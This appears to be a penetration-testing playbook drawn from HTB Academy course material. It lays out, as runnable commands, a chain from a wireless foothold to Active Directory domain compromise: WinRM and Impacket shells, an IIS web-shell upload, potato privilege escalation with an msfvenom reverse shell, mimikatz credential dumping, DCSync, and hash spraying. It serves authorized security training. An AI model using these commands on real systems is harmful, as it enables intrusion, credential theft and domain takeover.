# Wireless - Host privilege escalation and domain compromise

## Getting a shell on a host the credential can reach

**Trigger:** Enumeration showed the current user has WinRM, or administrative, access to an internal host.

A credential that authenticates is not yet a shell, and the route to one depends on what the account can do and which services the host exposes. WinRM on 5985 is the cleanest interactive route and `evil-winrm` is the standard client — a low-privilege user with Remote Management rights lands in a normal PowerShell session, which is enough to enumerate the host and stage the next step. Where the account is a local administrator on the host, the Impacket exec family gives you a shell as that admin: `psexec` and `smbexec` over SMB, `wmiexec` over WMI, each with slightly different footprint and reliability. Prefer `wmiexec` when you want to be quieter and `psexec` when you need a fully interactive SYSTEM shell. Once on the host, enumerate before escalating: the privileges the account holds decide the escalation technique, and `whoami /priv` is the first command every time because a single enabled privilege — `SeImpersonate` above all — often is the escalation. Read the web roots, the scheduled tasks, the services and the installed software, because a host reached from wireless is frequently a neglected web or application server rather than a hardened one.

```bash
# WinRM — interactive, low-privilege is enough
evil-winrm -u jdorian -p 'P4ssw0rd123456789' -i 172.16.10.71
evil-winrm -u administrator -H '<nthash>' -i 172.16.10.71      # pass-the-hash

# Local admin -> shell via Impacket
psexec.py corp.local/administrator@172.16.10.71 -hashes :<nthash>
wmiexec.py corp.local/administrator@172.16.10.71               # quieter
smbexec.py corp.local/administrator@172.16.10.71

# First moves on the host
whoami /priv                           # SeImpersonate here changes everything
whoami /groups
icacls C:\inetpub\wwwroot             # world-writable web root is a common find
Get-ScheduledTask | Where State -eq Ready
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — AD Enumeration & Internal Foothold, Exploitation and Privilege Escalation

## Writable web root to a foothold shell

**Trigger:** `icacls` shows the current user or BUILTIN\Users has write access to a served web directory.

A web root that everyone can write to, on a host running IIS or another application server, is a direct path to code execution as the service account, and it is a common misconfiguration on the neglected internal web servers a wireless engagement tends to reach. If the server executes `.aspx` — which IIS does by default — writing a web shell into the root and requesting it runs your code in the application pool's context. Upload the shell, set the callback address to your *wireless* interface's address rather than any other interface on your attack host, start a listener, and request the page. The resulting shell runs as the application pool identity, which on IIS carries `SeImpersonatePrivilege` by default, and that privilege is the escalation to SYSTEM. Match the payload to what the server runs: `.aspx` for IIS, `.php` for a LAMP stack, `.jsp` for Tomcat. Keep the shell you upload noted in your log, because it is a file you placed on a client system and must remove afterwards.

```bash
# Confirm write access and executable type
icacls C:\inetpub\wwwroot          # (OI)(CI)(F) for Users = world-writable

# From an evil-winrm session, upload an aspx shell with your wlan IP baked in
upload shell.aspx C:\inetpub\wwwroot\shell.aspx

# Listener on the wireless interface address, then request the page
nc -lvnp 443
curl http://172.16.10.71/shell.aspx

# Lands as the app-pool identity, which has SeImpersonatePrivilege
whoami                              # iis apppool\defaultapppool
whoami /priv                        # SeImpersonatePrivilege : Enabled  -> escalate below
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Exploitation and Privilege Escalation

## SeImpersonate to SYSTEM

**Trigger:** `whoami /priv` on a shell shows `SeImpersonatePrivilege` enabled — typical for service and app-pool accounts.

`SeImpersonatePrivilege` lets a process impersonate the security context of a client that connects to it, and the "potato" family of tools weaponises this by tricking a SYSTEM service into authenticating to an attacker-controlled endpoint and then stealing its token. Any service account that has this privilege — IIS application pools, SQL Server, many others — can escalate to SYSTEM with it, which is why a web-shell foothold as the app-pool identity is usually one step from full host compromise. Which tool works depends on the Windows version: JuicyPotato on older builds up to Server 2016, PrintSpoofer and the RoguePotato/GodPotato lineage on Server 2019 and later where the original DCOM path was closed. Upload the tool and a payload that calls back to your wireless address, run it, and catch a SYSTEM shell. From SYSTEM on a domain-joined host you can dump the machine's secrets, which frequently includes cached credentials, autologon passwords in the registry, and service account passwords — the material that lets you move off this host to a better-privileged account.

```bash
# Pick by OS version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Server 2019+ : PrintSpoofer or GodPotato
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "C:\temp\shell.exe"

# Up to Server 2016 : JuicyPotato with a working CLSID
msfvenom -p windows/x64/shell_reverse_tcp lhost=172.16.10.95 lport=8443 -f exe -o shell.exe
.\JuicyPotato.exe -l 53375 -p C:\temp\shell.exe -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}

# Catch SYSTEM, then harvest secrets from the host
nc -lvnp 8443
#   whoami -> nt authority\system
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "sekurlsa::logonpasswords" exit
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Exploitation and Privilege Escalation

## DCSync to the domain

**Trigger:** BloodHound or enumeration shows an account with replication rights (`GetChanges` + `GetChangesAll`) over the domain object.

An account with directory replication rights can ask a domain controller to replicate account data, which includes the password hashes of every principal in the domain — this is DCSync, and it is the edge that ends the engagement because it does not require code execution on the domain controller, only the replication permission. The permission is granted legitimately to domain controllers and to some administrative accounts, and it is frequently over-delegated to a service or backup account whose password you recovered from a share three steps back, which is the usual way a wireless foothold reaches it. `secretsdump` performs the replication over the network and writes the hashes out; pull the whole directory rather than a single account, because the built-in Administrator's hash (RID 500) is what you use to prove domain compromise, and the krbtgt hash is what a golden-ticket persistence finding would rest on. Save the output to a file — it is the raw material for the password-strength analysis and for the pass-the-hash that demonstrates impact. Extracting NTDS is high-impact and usually requires explicit sign-off before you do it on a real network.

```bash
# DCSync a single account to confirm the right exists
secretsdump.py corp.local/infra-adm:'Aut0maT10N'@172.16.10.72 -just-dc-user administrator

# Full directory dump (get sign-off first on a live network)
secretsdump.py corp.local/infra-adm:'Aut0maT10N'@172.16.10.72 -outputfile corp_ntds
nxc smb 172.16.10.72 -u infra-adm -p 'Aut0maT10N' --ntds

# Output: domain\user:rid:lmhash:nthash:::  and Kerberos keys
#   Administrator:500:...:<nthash>:::   <- domain compromise
#   krbtgt:502:...:<nthash>:::          <- persistence material

# Prove it with the Administrator hash — pass-the-hash to the DC
wmiexec.py administrator@172.16.10.72 -hashes :<administrator-nthash>
#   whoami -> corp\administrator
nxc smb 172.16.10.72 -u administrator -H <administrator-nthash>
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Active Directory Domain Compromise

## Password reuse as the connective tissue

**Trigger:** At any point you recover a credential — cracked, cleartext or a hash.

The single most productive habit in the internal phase is to test every recovered credential against everything, because password reuse is pervasive and it is what turns a set of individually minor findings into a chain. A password cracked from a service account is tried against every user; an NTLM hash pulled from one host is sprayed across the subnet with pass-the-hash; a cleartext password from a config file is tried against the domain admin accounts with similar names. The wireless origin makes this especially likely to pay off, because the credential that walked into your RADIUS was a real employee's working password and people reuse their working password across systems. Do this after every recovery rather than at the end, because a credential you find early often unlocks a host you could not otherwise reach, and finding that out immediately reorders the rest of the engagement. `netexec` sprays a credential or a hash across a subnet in one command; use `--continue-on-success` so it reports every host that accepts rather than stopping at the first.

```bash
# Spray a password across the subnet
nxc smb 172.16.10.0/24 -u recovered_user -p 'RecoveredPass' --continue-on-success
nxc smb 172.16.10.0/24 -u users.txt -p 'RecoveredPass' --continue-on-success

# Pass-the-hash across the subnet
nxc smb 172.16.10.0/24 -u administrator -H <nthash> --continue-on-success
nxc winrm 172.16.10.0/24 -u administrator -H <nthash>

# One password against many similarly-named accounts (adm variants reuse constantly)
for u in jane jane_adm jsmith jsmith_adm svc_backup; do
  nxc smb 172.16.10.72 -u "$u" -p 'RecoveredPass' --continue-on-success
done
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Exploitation and Privilege Escalation, Lateral Movement
